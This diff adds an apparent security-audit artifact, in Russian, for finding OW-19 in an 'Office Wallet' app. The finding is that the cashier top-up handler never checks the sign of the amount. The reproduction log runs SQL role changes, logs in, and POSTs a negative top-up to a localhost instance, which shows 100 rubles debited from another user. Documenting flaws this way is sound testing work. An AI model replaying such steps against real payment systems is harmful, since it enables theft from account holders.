@@ -1,0 +1,36 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-19
+################################################################################################
+== 9. OW-19: отрицательное кассовое пополнение ==
+    · cashierTopup вызывает тот же parseRubToKop и проверяет только amount != 0
+    · (handlers_accounting.go:26-37) — знак не проверяется вовсе. Кассир (и админ,
+    · у admin роль считается кассиром) проводит пополнение на отрицательную сумму,
+    · и деньги списываются у жертвы как обычное «пополнение». Сначала поднимаем
+    · себе роль кассира — она пишется в базу, а кука её пока не знает:
+    → SQL SELECT role FROM users WHERE login='ivanov'
+    ← psql admin
+    → SQL UPDATE users SET role='cashier' WHERE login='ivanov' RETURNING role;
+    ← psql cashier
+    UPDATE 1
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT balance_kop FROM users WHERE login='petrova'
+    ← psql 932300
+    → POST /cashier/topup  login=petrova amount_rub=-100 (минус 100₽)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT balance_kop FROM users WHERE login='petrova'
+    ← psql 922300
+    → SQL SELECT kind||' '||amount_kop||' '||memo FROM operations ORDER BY id DESC LIMIT 1;
+    ← psql topup -10000 Кассовое пополнение
+    ┌─ АРТЕФАКТ · OW-19 · отрицательное кассовое пополнение
+    │ petrova balance_kop: 932300 → 922300
+    │ последняя операция: kind|amount_kop|memo приведена в SQL-ответе выше
+    └─
+[+] баланс petrova 932300 -> 922300 коп: отрицательное «пополнение» проведено, в операциях строка topup с минусом
+    → SQL UPDATE users SET role='admin' WHERE login='ivanov' RETURNING role;
+    ← psql admin
+    UPDATE 1
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    роль ivanov возвращена: admin
